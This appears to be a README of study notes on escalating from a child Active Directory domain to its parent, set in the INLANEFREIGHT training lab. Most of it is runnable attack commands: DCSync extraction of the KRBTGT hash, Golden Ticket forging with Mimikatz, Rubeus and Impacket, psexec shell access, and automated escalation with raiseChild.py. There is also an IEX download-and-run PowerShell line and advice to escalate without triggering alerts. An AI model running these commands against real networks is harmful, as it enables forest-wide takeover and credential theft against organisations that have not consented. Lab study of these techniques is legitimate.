# Active Directory Trust Relationships (Child > Parent Trusts)

This README focuses on enumerating trust relationships between child domains (e.g., `LOGISTICS.INLANEFREIGHT.LOCAL`) and parent domains (e.g., `INLANEFREIGHT.LOCAL`), exploiting them to escalate privileges using Golden Tickets and DCSync attacks.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Enumerating Trust Relationships](#enumerating-trust-relationships)
- [Enumerating Child Domain Users and Groups](#enumerating-child-domain-users-and-groups)
- [Extracting Credentials](#extracting-credentials)
- [Creating and Using Golden Tickets](#creating-and-using-golden-tickets)
- [Escalating from Child to Parent](#escalating-from-child-to-parent)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Trust relationships allow resource sharing between child and parent domains in an AD forest. Attackers can exploit these trusts to extract credentials (e.g., KRBTGT hash) from a child domain and forge Golden Tickets to impersonate any user in the forest, including the parent domain. This guide uses PowerView, Mimikatz, Rubeus, and Impacket to enumerate and exploit these trusts.

## Setup and Prerequisites

- **Environment**: Windows host for PowerView, Mimikatz, and Rubeus; Linux host for Impacket.
- **Active Directory Module**: Install on Windows (e.g., via RSAT tools) and import with `Import-Module ActiveDirectory`.
- **PowerView**: Load into memory on Windows:
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
  ```
- **Mimikatz**: Download the executable on Windows (e.g., from its GitHub repo) and place in `C:\Tools\`.
- **Rubeus**: Download the executable on Windows and place in your working directory.
- **Impacket**: Install on Linux (e.g., `pip install impacket`) for `secretsdump.py`, `lookupsid.py`, `ticketer.py`, `psexec.py`, and `raiseChild.py`.
- **PowerShell**: Run with administrative privileges on Windows (right-click > "Run as Administrator").
- **Credentials**: Use compromised credentials (e.g., `INLANEFREIGHT\lafi` or `LOGISTICS.INLANEFREIGHT.LOCAL\krbtgt`) with access to the child domain.
- **Network Access**: Ensure connectivity to domain controllers (e.g., 172.16.5.5, 172.16.5.240).

## Enumerating Trust Relationships

Map trust relationships between child and parent domains:

```powershell
# Import the Active Directory module for PowerShell cmdlets (Windows host)
Import-Module ActiveDirectory

# Enumerate all trust relationships in the target Windows domain (Windows host)
Get-ADTrust -Filter *

# Use PowerView to enumerate trust relationships in the target domain (Windows host)
Get-DomainTrust

# Use PowerView to perform a comprehensive domain trust mapping (Windows host)
Get-DomainTrustMapping
```

## Enumerating Child Domain Users and Groups

Gather information from the child domain to identify attack targets:

```powershell
# Enumerate users in the LOGISTICS.INLANEFREIGHT.LOCAL child domain
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

# Retrieve the SID for the target child domain
Get-DomainSID

# Obtain the SID of the "Enterprise Admins" group in the parent domain
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

# List contents of the C$ share on the parent domain controller
ls \\academy-ea-dc01.inlanefreight.local\c$
```

## Extracting Credentials

Extract hashes from the child domain to support Golden Ticket creation:

```powershell
# Obtain the KRBTGT account's NT hash from the child domain (Windows host)
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# Perform a DCSync attack on the lab_adm user in the parent domain (Windows host)
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

```bash
# Use Impacket to perform a DCSync attack (Linux host)
secretsdump.py logistics.inlanefreight.local/lafi@172.16.5.240 -just-dc-user LOGISTICS\krbtgt
```

## Creating and Using Golden Tickets

Forge Golden Tickets to impersonate any user in the forest:

```powershell
# Create and apply Golden Ticket using Mimikatz
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# Create and apply Golden Ticket using Rubeus
Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

```bash
# Create Golden Ticket using Impacket (Linux host)
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# Set Kerberos credential cache
export KRB5CCNAME=hacker.ccache

# Establish shell session using Golden Ticket
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@lafi-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

## Escalating from Child to Parent

Automate the escalation process using Impacket:

```bash
# Perform child-to-parent domain escalation attack
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/lafi
```

## Enumerating Domain SIDs

Identify SIDs for crafting Golden Tickets:

```bash
# Perform SID brute-forcing attack
lookupsid.py logistics.inlanefreight.local/lafi@172.16.5.240

# Extract domain SID
lookupsid.py logistics.inlanefreight.local/lafi@172.16.5.240 | grep "Domain SID"

# Get Enterprise Admins SID
lookupsid.py logistics.inlanefreight.local/lafi@172.16.5.5 | grep -B12 "Enterprise Admins"
```

## Black Hat Mindset

1. **Map the Trust**: Enumerate all trust relationships to identify child-parent dependencies.
2. **Target KRBTGT**: Extract the KRBTGT hash from the child domain as the key to forging Golden Tickets.
3. **Escalate Silently**: Use Golden Tickets to impersonate high-privilege accounts (e.g., Enterprise Admins) without triggering alerts.
4. **Automate Attacks**: Leverage tools like `raiseChild.py` to streamline child-to-parent escalation.

## Resources

- [PowerView Documentation]()
- [Mimikatz Guide]()
- [Rubeus GitHub]()
- [Impacket Guide]()
- [Golden Ticket Attacks]()

